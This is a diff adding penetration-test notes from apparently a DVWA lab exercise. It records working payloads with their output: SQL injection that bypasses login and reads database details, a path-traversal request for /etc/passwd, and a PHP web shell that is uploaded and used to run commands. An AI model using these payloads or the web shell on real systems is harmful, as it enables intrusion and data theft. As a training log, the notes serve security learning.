@@ -1,0 +1,23 @@
+# Phase 4: Vulnerability Analysis - SQL Injection (SQLi)
+# Confirmed vulnerability by using a single quote ('') which caused an HTTP 500 error.
+# SUCCESS: Bypassed login and enumerated all users.
+# Payload: 1' OR '1'='1' #
+# Output: Returns all users (admin, Gordon, Hack, Pablo, Bob).
+
+# SUCCESS: Determined column count (2) and extracted database information.
+# Payload: 1' UNION SELECT @@version, database() #
+# Output: First name: 10.6.22-MariaDB-0ubuntu0.22.04.1 | Surname: dvwa
+
+# Phase 4: Vulnerability Analysis - Local File Inclusion (LFI)
+# SUCCESS: Tested LFI vulnerability using path traversal.
+# Payload (URL): http://192.168.10.11/dvwa/vulnerabilities/fi/?page=../../../../etc/passwd
+# Output: Blank page (confirmed LFI vulnerability present).
+
+# Phase 4: Vulnerability Analysis - File Upload (RCE)
+dele@dele-VirtualBox:~/WebApp-Vuln-Assessment$ echo '<?php system($_GET["cmd"]); ?>' > shell.php
+dele@dele-VirtualBox:~/WebApp-Vuln-Assessment$ # Uploaded shell.php via web interface.
+# Output: ../../hackable/uploads/shell_low.php succesfully uploaded!
+
+# SUCCESS: Executed remote command to confirm compromise.
+# Payload (URL): http://192.168.10.11/dvwa/hackable/uploads/shell_low.php?cmd=id
+# Output: uid=33(www-data) gid=33(www-data) groups=33(www-data)
